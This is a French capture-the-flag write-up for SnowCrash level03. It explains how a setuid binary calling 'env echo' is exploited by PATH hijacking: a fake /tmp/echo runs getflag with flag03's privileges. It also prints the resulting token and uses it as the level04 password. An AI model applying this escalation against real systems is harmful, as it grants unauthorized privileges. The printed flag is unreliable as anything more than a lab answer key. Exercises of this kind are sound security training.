# README - Exploitation de la vulnérabilité du binaire level03

## Étapes suivies pour obtenir le Flag03

### 1. Identification du binaire

Le fichier `level03` est un exécutable avec les permissions **setuid** et **setgid**, ce qui signifie qu'il s'exécute avec les privilèges de l'utilisateur `flag03` :

```bash
level03@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

### 2. Analyse du fichier exécutable

En analysant le fichier avec la commande `strings`, on observe un appel à la commande suivante :

```bash
/usr/bin/env echo Exploit me
```

Cela indique que le programme utilise `env` pour trouver et exécuter la commande `echo`. Cela peut être exploitable via un **PATH hijacking**.

### 3. Création d'un faux binaire "echo"

Nous allons créer un fichier `echo` dans un répertoire que nous contrôlons (par exemple `/tmp`) pour exécuter une commande malveillante permettant d'obtenir le flag.

#### a. Création du faux binaire

Créez un fichier `echo` qui exécute la commande `getflag` :

```bash
echo "/bin/sh -c 'getflag'" > /tmp/echo
chmod +x /tmp/echo
```

#### b. Modification du PATH

Modifiez la variable `PATH` pour que le répertoire `/tmp` soit prioritaire :

```bash
export PATH=/tmp:$PATH
```

### 4. Exécution de level03

Lancez l'exécutable `level03` :

```bash
./level03
```

Puisque le binaire `level03` utilise `env` pour appeler `echo`, il trouvera notre faux binaire dans `/tmp` et exécutera la commande `getflag` avec les privilèges de `flag03`.

### 5. Récupération du flag

Si tout fonctionne correctement, vous obtiendrez le flag :

```bash
Check flag.Here is your token : qi0ma5uox3af3bc7s4rdp0kc
```

### 6. Passage à l'utilisateur suivant

Utilisez le flag pour vous connecter à l'utilisateur `level04` :

```bash
level03@SnowCrash:~$ su level04
Password: qi0ma5uox3af3bc7s4rdp0kc
level04@SnowCrash:~$ 
```